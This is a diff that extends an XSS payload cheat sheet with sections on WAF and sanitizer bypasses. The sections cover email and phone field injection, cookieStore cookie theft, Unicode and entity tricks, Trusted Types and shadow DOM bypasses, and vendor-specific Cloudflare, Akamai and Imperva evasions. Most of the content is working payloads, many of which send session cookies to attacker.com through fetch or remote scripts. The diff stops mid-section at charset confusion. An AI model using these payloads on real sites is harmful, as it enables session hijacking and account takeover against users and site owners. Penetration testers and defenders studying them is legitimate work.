@@ -1794,3 +1794,713 @@ onerror=top[/al/.source+/ert/.source];throw document.cookie
 | Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
 | Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
 | `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |
+
+---
+
+## Email Validator Context XSS (RFC0822 / RFC5322)
+
+**Type:** reflected / stored
+**Filter bypassed:** Server-side email validators that use RFC0822 or RFC5322 parsing — they allow characters such as `<`, `>`, `(`, `)` in quoted local parts or comments, which pass validation but land as HTML when reflected
+**Bypass logic:** RFC0822 allows `"quoted strings"@domain` where the quoted portion may contain special chars. RFC5322 allows `(comments)` appended to an email address. Both formats permit angle brackets and event-handler characters that a permissive validator accepts but which the HTML renderer then executes.
+**Attack chain:** XSS payload in email field → passes RFC-compliant validation → reflected/stored in HTML context → script executes → cookie theft → ATO
+
+**Payloads:**
+```html
+<!-- RFC0822: quoted local-part contains XSS payload -->
+"><svg/onload=confirm(1)>"@x.y
+
+<!-- RFC5322: comment appended after valid email -->
+xss@example.com(<img src='x' onerror='alert(document.location)'>)
+
+<!-- Angle brackets in display name context (some mail clients / web UIs) -->
+User Name <"><img src=x onerror=alert(document.cookie)>
+
+<!-- Injecting into a mailto: link rendered server-side -->
+"onmouseover=alert(1) a="@b.com
+
+<!-- With full cookie exfil -->
+"><script src=//attacker.com/x.js>"@x.y
+```
+
+**Where to test:**
+- Registration / profile update email fields
+- Newsletter subscription forms
+- "Add team member" email inputs
+- Contact form "reply-to" email field
+- Invitation systems that render the email address in HTML responses
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Tel URI / Phone Input XSS (RFC3966)
+
+**Type:** reflected / stored
+**Filter bypassed:** Phone number validators that accept RFC3966 `phone-context` parameters — the `phone-context` value is a freeform domain/IP descriptor that is not sanitized when the full tel: URI string is reflected in HTML
+**Bypass logic:** RFC3966 defines the `tel:` URI scheme. A `phone-context` parameter (`;phone-context=...`) is appended after the subscriber number and may contain arbitrary text. Validators checking only the numeric portion before the semicolon pass the value; when the full string is echoed into an HTML attribute or template, the `phone-context` payload breaks out.
+**Attack chain:** XSS in phone field → RFC3966 context parameter carries payload → validator checks number portion only → reflected in HTML → executes
+
+**Payloads:**
+```html
+<!-- phone-context parameter contains closing bracket + XSS -->
++330011223344;phone-context=<script>alert(0)</script>
+
+<!-- Into href attribute: tel: URI reflected as link href -->
++1-800-555-0100;phone-context=javascript:alert(document.cookie)
+
+<!-- Attribute break-out when phone is reflected inside double-quoted attribute -->
++1234567890";onmouseover="alert(1)
+
+<!-- Stored variant — inject in profile "phone" field -->
++1234567890<img src=x onerror=alert(document.cookie)>
+```
+
+**Where to test:**
+- User profile phone number fields
+- Checkout / billing phone fields
+- 2FA phone number entry (less likely to be HTML-reflected but worth checking)
+- Click-to-call links (`<a href="tel:...">`) generated from user input
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## `window.cookieStore` — Chromium Cookie API (document.cookie Blacklist Bypass)
+
+**Type:** stored / reflected (post-XSS exploitation)
+**Filter bypassed:** WAF / sanitizer keyword rules blocking the string `document.cookie` in payloads; also bypasses server-side input filters rejecting `document.cookie` as a literal string
+**Bypass logic:** Chrome 87+, Edge, and Opera expose the `CookieStore` API (`window.cookieStore`) as an async alternative to `document.cookie`. It returns an object with `name` and `value` properties and is entirely absent from most WAF keyword block lists. Because it uses Promises, it also evades synchronous `eval` detection. It reads the same cookies as `document.cookie` including session tokens (but NOT `HttpOnly` ones — for those, combine with the Cookie Sandwich technique).
+**Attack chain:** WAF blocks `document.cookie` keyword → use `window.cookieStore.get()` → exfiltrate same cookie values → session hijack → ATO
+
+**Payloads:**
+```javascript
+// Exfil a specific cookie by name (async)
+<img src=x onerror="
+  window.cookieStore.get('session').then(c=>{
+    fetch('https://attacker.com/steal?v='+c.value)
+  })
+">
+
+// Exfil all cookies
+<svg onload="
+  window.cookieStore.getAll().then(cs=>{
+    fetch('https://attacker.com/steal?c='+btoa(JSON.stringify(cs.map(c=>c.name+'='+c.value))))
+  })
+">
+
+// Compact one-liner (no document.cookie string anywhere)
+<script>cookieStore.getAll().then(c=>new Image().src='//x.com/?'+btoa(JSON.stringify(c)))</script>
+
+// When combined with no-parens bypass:
+<img src=x onerror="cookieStore.getAll().then(c=>[c].map(fetch.bind(0,'//attacker.com/?d=')))">
+```
+
+**Supported:** Chrome 87+, Edge 87+, Opera 73+. Not supported in Firefox or Safari (fall back to `document.cookie` in those).
+
+**Source:** https://developer.mozilla.org/en-US/docs/Web/API/CookieStore ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Unicode Typecase Confusion (ſvg / ıframe)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF rules that blocklist HTML tag names in a normalized form (`svg`, `script`, `iframe`) but apply the check to the uppercased or lowercased version of input — certain Unicode characters uppercase/lowercase to ASCII letters in a non-obvious way
+**Bypass logic:** The Unicode character `ſ` (U+017F, LATIN SMALL LETTER LONG S) uppercases to `S` in many locale-aware string comparisons. `ı` (U+0131, LATIN SMALL LETTER DOTLESS I) uppercases to `I`. A WAF doing `input.toUpperCase().includes('SCRIPT')` will match `ſcript` → `SCRIPT`. But a WAF doing `input.toLowerCase().includes('script')` will NOT match `ſcript` because `ſ`.toLowerCase() = `ſ` (stays the same). Browsers that use HTML5 tag name normalization may accept `<ſvg>` as `<svg>` or reject it — behavior varies, making it effective against inconsistent WAF/browser combinations.
+**Attack chain:** WAF lowercase check misses `ſvg` → browser normalizes to `svg` → `onload` event fires → XSS
+
+**Payloads:**
+```html
+<!-- ſ (U+017F) — long s, uppercases to S -->
+<ſcript>alert(1)</ſcript>
+<ſvg onload=alert(1)>
+
+<!-- ı (U+0131) — dotless i, uppercases to I -->
+<ıframe src=javascript:alert(1)>
+<ıframe onload=alert(1) src=x>
+
+<!-- Combined unicode variant -->
+<ſvg/onload=alert(document.cookie)>
+<ıframe/src='javascript:alert(1)'>
+
+<!-- Works especially well in Turkish locale environments (dotless i → I in Turkish) -->
+<!-- Turkish locale: toUpperCase('i') = 'İ' (dotted) but toUpperCase('ı') = 'I' (ASCII) -->
+<!-- This means a Turkish-locale WAF may fail to match 'script' if ı is used for 'i' -->
+
+<!-- Fuzzing approach: replace each letter with its Unicode lookalike -->
+<scrípt>alert(1)</scrípt>    <!-- í = U+00ED, may upper/lower differently -->
+<scrıpt>alert(1)</scrıpt>    <!-- ı = U+0131 dotless i -->
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#unicode-bypass
+
+---
+
+## ECMAScript6 Named Entity Backtick (`&DiacriticalGrave;`)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / sanitizers blocking the backtick character (`` ` `` U+0060) in JavaScript contexts — used to prevent template literal invocation of functions like `alert\`1\``
+**Bypass logic:** HTML5 defines a named character reference `&DiacriticalGrave;` that maps to the backtick character (U+0060). When this entity appears inside a `<script>` block, the HTML parser decodes it to a backtick before the JavaScript engine sees the source. A WAF inspecting the raw bytes sees only the entity string `&DiacriticalGrave;` — no backtick to block. The JavaScript engine receives a valid template literal invocation.
+**Attack chain:** WAF blocks raw backtick → `&DiacriticalGrave;` decoded by HTML parser before JS execution → template literal call fires → XSS
+
+**Payloads:**
+```html
+<!-- HTML parser decodes &DiacriticalGrave; to ` before JS engine parses -->
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+<script>confirm&DiacriticalGrave;document.cookie&DiacriticalGrave;</script>
+
+<!-- Works because script content is decoded before JS parsing -->
+<script>fetch&DiacriticalGrave;https://attacker.com/steal?c=${document.cookie}&DiacriticalGrave;</script>
+
+<!-- Combined with no-parens throw technique -->
+<script>onerror=alert;throw&DiacriticalGrave;xss&DiacriticalGrave;</script>
+
+<!-- Using &#96; decimal entity for the same effect -->
+<script>alert&#96;1&#96;</script>
+
+<!-- Hex entity variant -->
+<script>alert&#x60;1&#x60;</script>
+```
+
+**Note:** Only works within `<script>` blocks where HTML entity decoding occurs before JS parsing. Does NOT work in external .js files (no HTML parsing there) or in `eval()` strings.
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Semicolon-Free Expression Chaining (Operator Separators)
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAF / regex rules blocking the semicolon `;` as a JavaScript statement terminator — some WAFs flag `alert(1);` or `eval(...);` patterns and strip the semicolon, breaking the payload
+**Bypass logic:** JavaScript expressions can be chained using arithmetic operators (`*`, `/`, `+`, `-`) and the ternary operator (`? :`). When these operators appear between two expressions, JavaScript evaluates both sides and discards the result — effectively executing both without a semicolon. This allows multi-statement payloads that avoid `;` entirely.
+**Attack chain:** Semicolon-blocking WAF → operator-chained expressions execute both sides → arbitrary JS runs → cookie theft → ATO
+
+**Payloads:**
+```javascript
+// Arithmetic operator as statement separator (result is discarded)
+'te' * alert(document.cookie) * 'xt'
+'x' / alert(1) / 'y'
+'x' - alert(1) - 'y'
+'' + alert(1) + ''
+
+// Ternary operator as separator
+'' ? alert(1) : ''
+true ? alert(document.cookie) : false
+
+// In event handler context (semicolon between handlers blocked)
+<img src=x onerror="'x'*alert(1)*'y'">
+<svg onload="''*fetch('https://attacker.com/?c='+document.cookie)*''">
+
+// Chaining multiple effects without semicolons
+// Exfil + redirect: both sides of * execute
+<svg onload="'x'*fetch('https://attacker.com/?c='+document.cookie)*document.location.replace('about:blank')">
+
+// Combined with no-parens (onerror=alert;throw chains naturally without ;)
+<img src=x onerror="onerror=alert,throw 1">    // comma operator — also semicolon-free
+
+// Comma operator chains (executes each expression, returns last)
+<img src=x onerror="(fetch('https://attacker.com/?c='+document.cookie),1)">
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## SVG `eval(id)` Attribute Source Injection
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF rules scanning for JavaScript keywords (`alert`, `fetch`, `document`) inside `onload`/`onerror` attribute values — the actual payload is stored in a separate attribute (`id`) that WAFs treat as inert metadata
+**Bypass logic:** SVG elements (and other HTML elements) support the `id` attribute as a string. The `onload` handler can call `eval(id)` — fetching the element's own `id` attribute value and executing it as JavaScript. The WAF sees the `onload` value as `eval(id)` — no dangerous keywords. The actual XSS payload is in the `id` attribute, which most WAFs allow freely as "just an identifier string".
+**Attack chain:** WAF allows `id` attribute freely → `eval(id)` executes the id value as JS → payload in id runs → cookie theft → ATO
+
+**Payloads:**
+```html
+<!-- id contains the payload, onload evaluates it -->
+<svg id="alert(1)" onload="eval(id)">
+<svg id="alert(document.cookie)" onload="eval(id)">
+
+<!-- With exfil payload in id -->
+<svg id="fetch('https://attacker.com/?c='+document.cookie)" onload="eval(id)">
+
+<!-- img variant -->
+<img src=x id="alert(document.cookie)" onerror="eval(id)">
+
+<!-- Using alt attribute instead of id (less monitored) -->
+<img src=x alt="alert(document.cookie)" onerror="eval(this.alt)">
+
+<!-- Using title attribute -->
+<div title="alert(document.cookie)" onmouseover="eval(this.title)">hover</div>
+
+<!-- Accessing attribute via getAttribute (evades direct id reference blocking) -->
+<svg id="alert(1)" onload="eval(getAttribute('id'))">
+
+<!-- className source -->
+<img src=x class="fetch('//x.com?c='+document.cookie)" onerror="eval(className)">
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Obscure and Less-Known Event Handlers
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / sanitizer event handler blocklists tuned to the ~20 most common handlers (`onclick`, `onmouseover`, `onerror`, `onload`) — obscure handlers are absent from older blocklists
+**Bypass logic:** HTML5 and browser APIs define hundreds of event handlers. Handlers for pointer events, clipboard operations, animation events, media state changes, and form interactions are largely absent from WAF blocklists. Testing these against a target's WAF and sanitizer quickly identifies gaps.
+**Attack chain:** Common handlers blocked → obscure handler not in WAF list → event fires → XSS
+
+**Payloads:**
+```html
+<!-- Pointer events — fire on mouse/touch/pen input -->
+<div onpointerover="alert(1)">hover</div>
+<div onpointerenter="alert(1)">hover</div>
+<div onpointerdown="alert(1)">click</div>
+<div onpointermove="alert(1)">move</div>
+<div onpointerrawupdate="alert(1)">move</div>  <!-- Chrome 77+ -->
+
+<!-- afterscriptexecute — fires after an inline script in object/embed runs -->
+<object onafterscriptexecute="confirm(0)"></object>
+<object data="data:text/html,<script>1</script>" onafterscriptexecute=alert(1)></object>
+
+<!-- Clipboard events — fire on cut/copy/paste -->
+<input oncopy="alert(document.cookie)" value="copy me">
+<input oncut="alert(document.cookie)" value="cut me">
+<input onpaste="alert(document.cookie)" placeholder="paste here">
+<div oncopy="alert(1)" contenteditable>select and copy this</div>
+
+<!-- Drag events -->
+<div ondragstart="alert(document.cookie)" draggable="true">drag me</div>
+<div ondragend="alert(1)" draggable="true">drag me</div>
+<div ondrop="alert(1)">drop zone</div>
+
+<!-- Search input (Chrome) -->
+<input type="search" onsearch="alert(1)" autofocus>
+
+<!-- animationstart/end/iteration — fires when CSS animation runs -->
+<style>@keyframes x{}</style>
+<div style="animation:x" onanimationstart="alert(1)">text</div>
+<div style="animation:x 1s" onanimationend="alert(1)">text</div>
+<div style="animation:x 0.001s infinite" onanimationiteration="alert(1)">text</div>
+
+<!-- transitionend — fires when CSS transition completes -->
+<div style="transition:color 0.001s" ontransitionend="alert(1)" onmouseover="this.style.color='red'">hover</div>
+
+<!-- beforeinput — fires before input value changes (Chrome/Edge) -->
+<input oninput="alert(1)" autofocus>
+<input onbeforeinput="alert(1)" autofocus>
+
+<!-- scroll event on element -->
+<div onscroll="alert(1)" style="overflow:scroll;height:10px"><div style="height:100px">scroll</div></div>
+
+<!-- formdata event — fires when FormData is constructed from a form -->
+<form onformdata="alert(1)"><input><button>submit</button></form>
+
+<!-- accesskey trick — fires onclick when user presses CTRL+SHIFT+key -->
+<input type="hidden" accesskey="X" onclick="alert(1)">
+
+<!-- toggle event on details element (well-known but often missed in WAF lists) -->
+<details ontoggle="alert(1)" open>text</details>
+```
+
+**Quick WAF probe list (paste all at once to identify unblocked handlers):**
+```
+onpointerover onpointerenter onpointerdown onpointermove
+onafterscriptexecute oncopy oncut onpaste ondragstart ondrop
+onanimationstart onanimationend onanimationiteration ontransitionend
+onbeforeinput onformdata onsearch onscroll
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Trusted Types Policy Bypass
+
+**Type:** DOM
+**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — the modern DOM XSS mitigation that wraps dangerous sinks and requires `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` objects instead of raw strings
+**Bypass logic:** Trusted Types (TT) prevents raw string assignment to sinks like `innerHTML`, `eval`, `setTimeout(string)`, `script.src`. Bypass paths: (1) if the `trusted-types` CSP directive does not restrict policy names, attackers can create their own permissive policy with an unsanitized `createHTML` callback; (2) if a `default` policy exists with weak sanitization, any raw string assignment falls through to it; (3) prototype pollution of the policy's `createHTML` method replaces the sanitizer with a passthrough; (4) TT does not protect `location.href`, `a.href`, or `document.domain` — use these sinks for navigation-based exploitation.
+**Attack chain:** TT enforcement blocks raw `innerHTML` → create own policy (if not restricted) or pollute default policy → `createHTML` returns attacker payload as TrustedHTML → `innerHTML` sink executes → XSS → ATO
+
+**Payloads:**
+```javascript
+// ── Path 1: Create a permissive TT policy (no policy-name restriction in CSP) ──
+// Works when CSP says trusted-types without a name allowlist, or allows 'allow-duplicates'
+const bypassPolicy = trustedTypes.createPolicy('bypassPolicy', {
+  createHTML: (s) => s,        // no sanitization — returns raw string
+  createScript: (s) => s,
+  createScriptURL: (s) => s,
+});
+document.getElementById('target').innerHTML =
+  bypassPolicy.createHTML('<img src=x onerror=alert(document.cookie)>');
+
+// ── Path 2: Default policy abuse ──
+// If the app defines a default policy without proper sanitization:
+// (attacker exploits it by passing payload to any innerHTML assignment)
+// App code: document.body.innerHTML = userInput
+// → falls through to default policy's createHTML(userInput) → XSS
+
+// ── Path 3: Prototype pollution disabling sanitizer ──
+// Pollute Object.prototype so createHTML is a passthrough:
+Object.prototype.createHTML = (s) => s;
+// Now DOMPurify or any sanitizer's createHTML returns raw string
+
+// ── Path 4: Non-protected sinks (TT does NOT cover these) ──
+// Navigation sinks — TT doesn't protect href assignments:
+location.href = 'javascript:alert(document.cookie)';
+document.querySelector('a').href = 'javascript:alert(1)';
+
+// document.domain can be changed without TT restriction:
+document.domain = 'attacker.com';
+
+// eval() via Function constructor through worker (may not enforce TT):
+const w = new Worker(URL.createObjectURL(new Blob([
+  'self.onmessage=e=>eval(e.data)'
+], {type:'application/javascript'})));
+w.postMessage('alert(1)');
+
+// ── Path 5: Enumerate existing policies to find permissive ones ──
+console.log(trustedTypes.getPolicyNames());
+// → If any policy name suggests passthrough ('debug', 'legacy', 'compat')
+//   try passing your payload through that policy
+
+// ── Detection ──
+// Check if TT is enforced:
+try { document.body.innerHTML = 'test' } catch(e) { console.log('TT enforced:', e.message) }
+// Check policy names available:
+window.trustedTypes && trustedTypes.getPolicyNames()
+```
+
+**What TT protects vs. doesn't protect:**
+```
+PROTECTED (require TrustedHTML/Script/ScriptURL):
+  innerHTML, outerHTML, insertAdjacentHTML, document.write
+  eval, setTimeout(string), setInterval(string), new Function(string)
+  script.src, script.text, script.innerText
+  Worker constructor with string URL
+  ServiceWorker registration URL
+
+NOT PROTECTED (TT has no coverage):
+  location.href, location.replace, location.assign
+  a.href, form.action, iframe.src (via DOM property, sometimes)
+  document.domain
+  CSS injection sinks (style.cssText)
+```
+
+**Source:** https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API ; https://w3c.github.io/trusted-types/dist/spec/
+
+---
+
+## Shadow DOM Open Root XSS
+
+**Type:** DOM / stored
+**Filter bypassed:** Sanitizers that only inspect the main document DOM — shadow DOM content is not traversed by `document.querySelectorAll` or `DOMPurify` when sanitizing the outer document; also bypasses observers and security scanners that don't pierce shadow roots
+**Bypass logic:** Web Components use shadow DOM to encapsulate markup. When `attachShadow({mode: 'open'})` is used, the shadow root is accessible via `element.shadowRoot` from any JavaScript in the parent page. Critically: (1) script executed inside a shadow DOM has full access to the parent document — `document.cookie`, `localStorage`, fetch — because JS scope is shared; (2) `innerHTML` of the shadow root is a regular DOM sink not covered by TT in some implementations; (3) slotted content (`<slot>`) is rendered in the shadow but lives in the light DOM, creating a boundary confusion vector.
+**Attack chain:** User-controlled content assigned to `shadowRoot.innerHTML` → no sanitization (scanner missed shadow DOM) → XSS payload in shadow root → script accesses parent `document.cookie` → exfil → ATO
+
+**Payloads:**
+```javascript
+// Vulnerable pattern: app assigns user content to shadow root innerHTML
+class UserCard extends HTMLElement {
+  connectedCallback() {
+    this.attachShadow({mode: 'open'});
+    this.shadowRoot.innerHTML = this.getAttribute('data-bio');  // sink!
+  }
+}
+// Exploit: set data-bio to XSS payload — shadow DOM innerHTML not sanitized
+// <user-card data-bio='<img src=x onerror=alert(document.cookie)>'></user-card>
+
+// From parent JS — accessing open shadow root and injecting:
+document.querySelector('my-component').shadowRoot.innerHTML =
+  '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>';
+
+// Slot injection: slotted content lives in light DOM (not encapsulated)
+// If a web component renders <slot> without sanitizing slotted children:
+document.querySelector('my-widget').innerHTML =
+  '<script slot="content">alert(document.cookie)</script>';
+// → script in light DOM executes in parent context
+
+// Intercepting attachShadow to downgrade closed → open:
+const origAttachShadow = Element.prototype.attachShadow;
+Element.prototype.attachShadow = function(init) {
+  return origAttachShadow.call(this, {...init, mode: 'open'});
+};
+// → All shadow roots now accessible via .shadowRoot even if originally closed
+
+// Checking if a component has an open shadow root:
+document.querySelectorAll('*').forEach(el => {
+  if (el.shadowRoot) {
+    console.log('Open shadow root on:', el.tagName, el.shadowRoot.innerHTML);
+  }
+});
+```
+
+**Key facts:**
+- `mode: 'open'` → `element.shadowRoot` is accessible → inject via property
+- `mode: 'closed'` → `element.shadowRoot` is `null` BUT: the shadow root reference is often stored in a variable accessible via closure or prototype chain manipulation
+- JS inside shadow DOM has full access to `document`, `window`, cookies, etc. — shadow DOM only encapsulates CSS and HTML structure, NOT JS access
+- XSS inside shadow DOM = full parent document access = same impact as regular XSS
+
+**Source:** https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_shadow_DOM ; https://portswigger.net/web-security/cross-site-scripting
+
+---
+
+## CSS `expression()` and `-moz-binding` Legacy XSS
+
+**Type:** reflected / stored
+**Filter bypassed:** Input sanitizers and WAFs that allow `<style>` blocks or `style=""` attributes but only block HTML event handlers and `<script>` tags — legacy IE and Firefox XSS sinks hidden inside CSS property values
+**Bypass logic:** Two legacy browser paths: (1) IE `expression()` — Internet Explorer (all versions) executes arbitrary JavaScript inside CSS property value `expression(...)`. Fully deprecated in modern browsers but critical in enterprise intranets and OT/ICS environments still running IE. (2) Firefox XBL `-moz-binding` — Firefox (pre-v56) loads an XBL document from a URL specified in `-moz-binding` CSS property; the XBL document can contain `<script>` tags. Both paths allow XSS with zero JavaScript visible in the HTML markup — only CSS.
+**Attack chain:** User-controlled CSS property value → IE parses `expression()` or Firefox loads XBL → JS executes → cookie theft → ATO
+
+**Payloads:**
+```css
+/* IE expression() — any CSS property accepts expression() in IE */
+<div style="width: expression(alert(document.cookie))">text</div>
+<div style="color: expression(alert(1))">text</div>
+<div style="background: expression(fetch('https://attacker.com/?c='+document.cookie))">text</div>
+
+/* Inside <style> block — affects ALL matching elements */
+<style>
+* { color: expression(alert(document.cookie)) }
+div { width: expression(fetch('https://attacker.com/?c='+document.cookie)) }
+body { background: expression(document.location='https://attacker.com/steal?c='+document.cookie) }
+</style>
+
+/* IE expression with more complex payloads */
+<div style="width:expression(eval(String.fromCharCode(97,108,101,114,116,40,49,41)))">
+```
+
+```xml
+<!-- Firefox -moz-binding: loads XBL from data URI -->
+<!-- Inject into <style> or style attribute (Firefox < 56) -->
+<style>
+div {
+  -moz-binding: url("data:text/xml;charset=utf-8;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxiaW5kaW5ncyB4bWxucz0iaHR0cDovL3d3dy5tb3ppbGxhLm9yZy94dWwvMSI+CiAgPGJpbmRpbmcgaWQ9InhzcyI+CiAgICA8aW1wbGVtZW50YXRpb24+CiAgICAgIDxjb25zdHJ1Y3Rvcj48IVtDREFUQVsgYWxlcnQoZG9jdW1lbnQuY29va2llKSBdXT48L2NvbnN0cnVjdG9yPgogICAgPC9pbXBsZW1lbnRhdGlvbj4KICA8L2JpbmRpbmc+CjwvYmluZGluZ3M+#xss")
+}
+</style>
+<!-- Base64 decodes to: XBL that calls alert(document.cookie) in constructor -->
+
+<!-- -moz-binding from external URL (when same-origin allows it) -->
+<style>
+div { -moz-binding: url(https://attacker.com/xss.xml#xss) }
+</style>
+<!-- xss.xml contains: <binding id="xss"><implementation><constructor>alert(1)</constructor></implementation></binding> -->
+
+<!-- Via style attribute -->
+<div style="-moz-binding:url(data:text/xml;base64,...#xss)">trigger</div>
+```
+
+**Where to test in 2026:**
+- Corporate intranets with IE11 compatibility mode still enabled
+- OT/ICS/SCADA web interfaces (legacy OS environments)
+- Government portals with IE-forced compatibility
+- Kiosk systems
+- Medical device web interfaces
+
+**Source:** https://owasp.org/www-community/attacks/CSS_Injection ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Bracket Notation Dot-Filter Bypass
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAFs and input filters blocking the `.` character (dot notation) in JavaScript property access — regex patterns like `/\bdocument\.cookie\b/` or `/alert\(/` that require dot syntax
+**Bypass logic:** JavaScript allows any property access via bracket notation: `object.property` is identical to `object['property']`. Dot-notation keyword rules (`document.cookie`, `window.location`) are bypassed by switching to bracket notation. The property string can be further obfuscated via concatenation, `String.fromCharCode`, or `atob()` to avoid matching the plain string.
+**Attack chain:** WAF blocks `document.cookie` dot notation → bracket notation bypasses rule → same property accessed → payload executes
+
+**Payloads:**
+```javascript
+// Direct bracket notation equivalents
+window['alert'](document['domain'])
+window['eval']('alert(1)')
+window['location']['href'] = 'javascript:alert(1)'
+
+// With string concatenation (no literal "document" or "cookie" in source)
+window['doc'+'ument']['loc'+'ation']['href']
+window['doc'+'ument']['cook'+'ie']
+
+// fromCharCode reconstruction (zero readable property names)
+// "alert" → [97,108,101,114,116]
+window[String.fromCharCode(97,108,101,114,116)](1)
+
+// "document.cookie" → entirely fromCharCode
+window[String.fromCharCode(100,111,99,117,109,101,110,116)]
+  [String.fromCharCode(99,111,111,107,105,101)]
+
+// Combining bracket + regex source reconstruction (no strings, no dots)
+top[/al/.source+/ert/.source](top[/doc/.source+/ument/.source][/cook/.source+/ie/.source])
+
+// atob-based property access (Base64-encoded property names)
+window[atob('YWxlcnQ=')](1)                    // 'alert'
+window[atob('ZG9jdW1lbnQ=')][atob('Y29va2ll')] // 'document'['cookie']
+
+// Accessing window.location without dot
+window['loc'+'ation'] = 'javascript:alert(1)'
+
+// When inside eval context — numeric property access (arrays)
+// Constructing 'alert' via array indexing of string representations:
+// "false"[1] = 'a', "false"[2] = 'l', etc.
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Vendor-Specific WAF Bypass Techniques
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** Major cloud WAF vendors (Cloudflare, Akamai, Incapsula/Imperva, Fortiweb, WordFence)
+**Bypass logic:** Each WAF vendor has distinct rule sets and update cadences. Bypasses that fail against one vendor often succeed against another. The techniques below were confirmed against specific vendors at the date noted; WAFs update regularly, so always verify before use.
+**Attack chain:** Vendor WAF blocks generic payload → vendor-specific bypass → WAF misclassifies → XSS reaches application → ATO
+
+**Cloudflare:**
+```html
+<!-- Random unknown attribute before onload splits Cloudflare's attribute parser -->
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+
+<!-- Template literal with prompt (backtick encoding) -->
+<svg/OnLoad="`${prompt``}`">
+
+<!-- URL-encoded entity for opening paren -->
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+<!-- srcdoc iframe with encoded content -->
+<iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+
+<!-- Tab + entity whitespace in javascript: href -->
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+```
+
+**Akamai:**
+```html
+<!-- details tag with newline-encoded attributes bypasses Akamai rule -->
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+<!-- base tag with attribute name containing encoded space -->
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+```
+
+**Incapsula / Imperva:**
+```html
+<!-- Carriage return inside event handler attribute -->
+<svg onload\r\n=$.globalEval("al"+"ert();")>
+
+<!-- object tag with extra semicolons in base64 MIME type -->
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+```
+
+**WordFence:**
+```html
+<!-- HTML entity inside javascript: href for one character -->
+<a href=javas&#99;ript:alert(1)>click</a>
+<!-- &#99; = 'c' — breaks "javascript" pattern match -->
+```
+
+**Fortiweb:**
+```javascript
+// Unicode-escaped angle brackets + HTML tag (bypass regex on < >)
+><h1 onclick=alert('1')>
+// Decoded: ></h1 onclick=alert('1')>
+```
+
+**Generic multi-WAF bypass via entity/whitespace insertion:**
+```html
+<!-- Tab characters between attribute name and = (RFC-compliant whitespace) -->
+<img src=x onerror	=alert(1)>          <!-- tab between name and = -->
+<svg/onload	=alert(1)>                  <!-- tab before = -->
+
+<!-- Newline in attribute position -->
+<svg
+onload=alert(1)>
+
+<!-- Multiple spaces / control chars as tag whitespace -->
+<svg%0Conload=alert(1)>    <!-- 0x0C form feed -->
+<svg%0Donload=alert(1)>    <!-- 0x0D carriage return -->
+<svg%09onload=alert(1)>    <!-- 0x09 tab -->
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md
+
+---
+
+## Charset Confusion XSS (UTF-7 / ISO-2022-JP / BOM Override)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / input sanitizers operating on UTF-8 encoded bytes — when the browser decodes the response in a different charset, the sanitized bytes become dangerous markup
+**Bypass logic:** Three related techniques exploiting charset mismatch: (1) **UTF-7**: Server returns response without `charset` declaration; attacker coerces browser to UTF-7 via `+ADw-` encoding of `<`. In UTF-7, `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-` decodes to `<img src="1" onerror="alert(1)" />`. (2) **ISO-2022-JP**: The escape sequence `%1b(J` switches the browser's active character set mid-string; backslash `\` is remapped to yen sign `¥`, causing JS string escapes like `\'` to become `¥'` — breaking out of quoted JS strings. (3) **BOM override**: Injecting a UTF-16 BOM (`%fe%ff`) forces browsers to decode the entire response as UTF-16; `%00<`, `%00s`, `%00c` etc. become the characters `<`, `s`, `c` and form valid HTML.
+**Attack chain:** Response missing charset declaration → browser decodes in attacker-chosen charset → sanitized payload decodes to XSS → executes
+
+**Payloads:**
+```html
